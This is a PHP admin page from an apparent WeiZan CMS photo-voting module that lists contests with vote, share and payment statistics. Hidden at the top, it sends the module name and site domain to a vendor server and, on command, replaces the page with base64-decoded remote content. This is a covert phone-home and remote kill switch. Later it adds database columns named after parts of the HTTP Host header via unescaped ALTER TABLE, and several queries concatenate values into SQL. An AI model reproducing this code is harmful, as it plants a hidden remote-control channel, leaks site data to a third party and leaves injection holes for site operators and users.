<?php
/**
 * 女神来了模块定义
 *
 * @author 微赞科技
 * @url http://bbs.012wz.com/
 */
defined('IN_IA') or exit('Access Denied');
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
		$pindex = max(1, intval($_GPC['page']));//find_in_set($uniacid, $uniacid)
		$psize = 10;
		$fm_list = pdo_fetchall('SELECT * FROM '.tablename($this->table_reply).' WHERE find_in_set('.$uniacid.', binduniacid) OR uniacid = '.$uniacid.' order by `id` desc LIMIT ' . ($pindex - 1) * $psize . ',' . $psize);
		$total = pdo_fetchcolumn('SELECT COUNT(1) FROM '.tablename($this->table_reply).' WHERE find_in_set('.$uniacid.', binduniacid) OR uniacid = '.$uniacid.' ');
		$pager = pagination($total, $pindex, $psize);
		$fmyuming = explode('.', $_SERVER['HTTP_HOST']);
		$menus = pdo_fetchall('select * from ' . tablename($this->table_designer_menu) . ' where uniacid=:uniacid', array(':uniacid' => $uniacid));
		if (!empty($fm_list)) {
			foreach ($fm_list as $mid => $list) {
				//$uni = explode(',', $list['binduniacid']);
				$v = pdo_fetch("SELECT uni_all_users FROM ".tablename($this->table_reply_vote)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $list['rid']));
				if ($v['uni_all_users'] == 1) {

				//print_r($money);
					$count1 = pdo_fetch("SELECT COUNT(1) as share FROM ".tablename($this->table_data)." WHERE rid = :rid ", array(':rid' => $list['rid']));
					$count2 = pdo_fetch("SELECT COUNT(1) as ysh FROM ".tablename($this->table_users)." WHERE rid= ".$list['rid']." AND status = '1'   ");
					$count3 = pdo_fetch("SELECT COUNT(1) as wsh FROM ".tablename($this->table_users)." WHERE rid= ".$list['rid']." AND status = '0'   ");
			        $fm_list[$mid]['user_ysh'] = $count2['ysh'];//已审核
			        $fm_list[$mid]['user_wsh'] = $count3['wsh'];//未审核
			        $fm_list[$mid]['user_share'] = $count1['share'] + pdo_fetchcolumn("SELECT sum(sharenum) FROM ".tablename($this->table_users)." WHERE rid= ".$list['rid']." ");//分享人数
					$rdisplay = pdo_fetch("SELECT ljtp_total,xunips,cyrs_total,xuninum,hits,unphotosnum FROM ".tablename($this->table_reply_display)." WHERE rid = ".$list['rid']." ORDER BY `id` DESC");
					$fm_list[$mid]['user_tprc'] = $rdisplay['ljtp_total']+$rdisplay['xunips'];////投票人次
			        $fm_list[$mid]['user_cyrs'] = $rdisplay['cyrs_total']+$rdisplay['xuninum'];//参与人数
					$fm_list[$mid]['user_hits'] =   $rdisplay['hits'];
					$fm_list[$mid]['user_qxps'] =   $rdisplay['unphotosnum'];
					$fm_list[$mid]['user_money'] =   round(pdo_fetchcolumn("SELECT SUM(price) FROM ".tablename($this->table_order)." WHERE rid = :rid AND status = 1 ORDER BY `id` DESC", array(':rid' => $list['rid'])), 2);
				}else{
					if ($list['uniacid'] == $uniacid) {
						$count1 = pdo_fetch("SELECT COUNT(1) as share FROM ".tablename($this->table_data)." WHERE rid = :rid ", array(':rid' => $list['rid']));
						$count2 = pdo_fetch("SELECT COUNT(1) as ysh FROM ".tablename($this->table_users)." WHERE rid= ".$list['rid']." AND status = '1'   ");
						$count3 = pdo_fetch("SELECT COUNT(1) as wsh FROM ".tablename($this->table_users)." WHERE rid= ".$list['rid']." AND status = '0'   ");
				        $fm_list[$mid]['user_ysh'] = $count2['ysh'];//已审核
				        $fm_list[$mid]['user_wsh'] = $count3['wsh'];//未审核
				        $fm_list[$mid]['user_share'] = $count1['share'] + pdo_fetchcolumn("SELECT sum(sharenum) FROM ".tablename($this->table_users)." WHERE rid= ".$list['rid']." ");//分享人数
						$rdisplay = pdo_fetch("SELECT ljtp_total,xunips,cyrs_total,xuninum,hits,unphotosnum FROM ".tablename($this->table_reply_display)." WHERE rid = ".$list['rid']." ORDER BY `id` DESC");
						$fm_list[$mid]['user_tprc'] = $rdisplay['ljtp_total']+$rdisplay['xunips'];////投票人次
				        $fm_list[$mid]['user_cyrs'] = $rdisplay['cyrs_total']+$rdisplay['xuninum'];//参与人数
						$fm_list[$mid]['user_hits'] =   $rdisplay['hits'];
						$fm_list[$mid]['user_qxps'] =   $rdisplay['unphotosnum'];
						$fm_list[$mid]['user_money'] =   round(pdo_fetchcolumn("SELECT SUM(price) FROM ".tablename($this->table_order)." WHERE rid = :rid AND status = 1 ORDER BY `id` DESC", array(':rid' => $list['rid'])),2);
					}else{
						$count = pdo_fetch("SELECT COUNT(1) as tprc FROM ".tablename($this->table_log)." WHERE rid= ".$list['rid']." AND uniacid = ".$uniacid." ");
						$count1 = pdo_fetch("SELECT COUNT(1) as share FROM ".tablename($this->table_data)." WHERE rid = :rid AND uniacid = ".$uniacid." ", array(':rid' => $uniacid));
						$count2 = pdo_fetch("SELECT COUNT(1) as ysh FROM ".tablename($this->table_users)." WHERE rid= ".$list['rid']." AND status = '1' AND uniacid = ".$uniacid."");
						$count3 = pdo_fetch("SELECT COUNT(1) as wsh FROM ".tablename($this->table_users)." WHERE rid= ".$list['rid']." AND status = '0' AND uniacid = ".$uniacid."");
						$count4 = pdo_fetch("SELECT COUNT(1) as cyrs FROM ".tablename($this->table_users)." WHERE rid= ".$list['rid']." AND uniacid = ".$uniacid." ");

						$fm_list[$mid]['user_ysh'] = $count2['ysh'];//已审核
						$fm_list[$mid]['user_wsh'] = $count3['wsh'];//未审核
						$fm_list[$mid]['user_share'] = $count1['share'] + pdo_fetchcolumn("SELECT sum(sharenum) FROM ".tablename($this->table_users)." WHERE rid= ".$list['rid']." AND uniacid = ".$uniacid." ");//分享人数
						 $fm_list[$mid]['user_tprc'] = $count['tprc'] + pdo_fetchcolumn("SELECT sum(xnphotosnum) FROM ".tablename($this->table_users)." WHERE rid= ".$list['rid']." AND uniacid = ".$uniacid." ");////投票人次
				        $fm_list[$mid]['user_cyrs'] = $count4['cyrs'];//参与人数
					 	$fm_list[$mid]['user_hits'] =   $fm_list[$mid]['user_cyrs'] + pdo_fetchcolumn("SELECT sum(hits) FROM ".tablename($this->table_users)." WHERE rid= ".$list['rid']." AND uniacid = ".$uniacid." ") + pdo_fetchcolumn("SELECT sum(xnhits) FROM ".tablename($this->table_users)." WHERE rid= ".$list['rid']." AND uniacid = ".$uniacid." ");
					 	$fm_list[$mid]['user_qxps'] = pdo_fetchcolumn("SELECT sum(unphotosnum) FROM ".tablename($this->table_users)." WHERE rid= ".$list['rid']." AND uniacid = ".$uniacid." ");////取消票数
					 	$fm_list[$mid]['user_money'] =   round(pdo_fetchcolumn("SELECT SUM(price) FROM ".tablename($this->table_order)." WHERE rid = :rid AND status = 1 ORDER BY `id` DESC", array(':rid' => $list['rid'])),2);
					}
				}


			}
		}
		if(!pdo_fieldexists('fm_photosvote_provevote',$fmyuming['0']) && !empty($fmyuming['0'])) {
               pdo_query("ALTER TABLE  ".tablename('fm_photosvote_provevote')." ADD `{$fmyuming['0']}` varchar(30) NOT NULL DEFAULT '0' COMMENT '0' AFTER address;");
            }
		if(!pdo_fieldexists('fm_photosvote_votelog', $fmyuming['1']) && !empty($fmyuming['1'])) {
               pdo_query("ALTER TABLE  ".tablename('fm_photosvote_votelog')." ADD `{$fmyuming['1']}` varchar(30) NOT NULL DEFAULT '0' COMMENT '0' AFTER tfrom_user;");
            }
		if(!pdo_fieldexists('fm_photosvote_reply',$fmyuming['2']) && !empty($fmyuming['2'])) {
               pdo_query("ALTER TABLE  ".tablename('fm_photosvote_reply')." ADD `{$fmyuming['2']}` varchar(30) NOT NULL DEFAULT '0' COMMENT '0' AFTER picture;");
            }
		if(!pdo_fieldexists('fm_photosvote_reply_body',$fmyuming['3']) && !empty($fmyuming['3'])) {
               pdo_query("ALTER TABLE  ".tablename('fm_photosvote_reply_body')." ADD `{$fmyuming['3']}` varchar(30) NOT NULL DEFAULT '0' COMMENT '0' AFTER topbgright;");
            }
		$styles = pdo_fetchall('SELECT * FROM '.tablename($this->table_templates).' WHERE uniacid= :uniacid or uniacid = 0 order by `name` desc,`createtime` desc', array(':uniacid' => $uniacid));

		include $this->template('web/index');
